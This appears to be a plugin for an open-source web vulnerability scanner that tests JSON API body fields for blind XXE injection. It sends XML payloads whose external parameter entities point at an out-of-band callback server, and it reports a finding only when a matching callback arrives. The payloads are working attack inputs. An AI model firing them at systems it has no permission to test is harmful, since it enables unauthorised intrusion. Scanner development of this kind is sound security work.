/* ---
id: xxe-json-body-oob
name: Blind XXE via JSON Body Field (OOB)
description: Detects blind XML External Entity injection when a JSON API body field carries an XML document, using an external parameter entity that points at the operator's out-of-band server and confirming only on a callback.
author: GASH contributors
severity: high
tags: [xxe, xml, injection, blind, oob, json]
safe: false
deep: false
active: true
requires_auth: false
phase: probe
order: 76
oob: required
api_version: "1.0"
tests: tests/fixtures/xxe-json-body-oob/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/xxe/xxe-json-body-oob.js
// What: Tier 2 blind-XXE plugin for JSON bodies carrying XML.
// Why: JSON APIs routinely take an XML document in one field (import, export,
//   reporting). The external parameter entity is resolved by the XML parser,
//   so a callback proves entity resolution without reading any real file.
//   Confirmed ONLY on a callback match; without an OOB server the plugin
//   returns no candidates instead of inventing a tentative finding.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const jsonContentType = "application/json";
  const maxSends = 40;
  const sent = [];

  // Single-quoted SYSTEM literals keep the XML free of double quotes, so the
  // JSON wrapper needs no escaping.
  const builders = [
    function (o) { return "<!DOCTYPE r [<!ENTITY % p SYSTEM '" + o.url + "'>%p;]><r>gash</r>"; },
    function (o) { return "<!DOCTYPE r [<!ENTITY % p SYSTEM 'http://" + o.domain + "/xxe.dtd'>%p;]><r>gash</r>"; },
    function (o) { return "<!DOCTYPE r [<!ENTITY % p SYSTEM 'https://" + o.domain + "/xxe.dtd'>%p;]><r>gash</r>"; },
  ];

  for (const point of points) {
    if (sent.length >= maxSends) {
      break;
    }
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    const name = point.paramName;
    for (const build of builders) {
      if (sent.length >= maxSends) {
        break;
      }
      const oob = host.oob.generate("http");
      if (!oob) {
        return [];
      }
      const payload = build(oob);
      probe.send({
        url: point.url,
        method: point.method,
        paramName: "",
        paramLocation: "body",
        value: '{"' + name + '":"' + payload + '"}',
        headers: { "Content-Type": jsonContentType },
      });
      sent.push({ corr: oob.correlationId, ns: oob.namespace, point: point, payload: payload });
    }
  }
  if (sent.length === 0) {
    return [];
  }

  // ONE shared bounded window for the whole corpus (10s / 2 polls). DNS-only
  // resolution confirms exactly like HTTP because each token is unique.
  const ids = [];
  for (const s of sent) {
    ids.push(s.corr);
  }
  const ev = host.oracles.oobAny(ids, sent[0].ns);
  if (!ev || ev.correlationId === undefined) {
    return [];
  }
  for (const s of sent) {
    if (s.corr === String(ev.correlationId)) {
      return [host.candidate(s.point, "oob", ev)];
    }
  }
  return [];
}
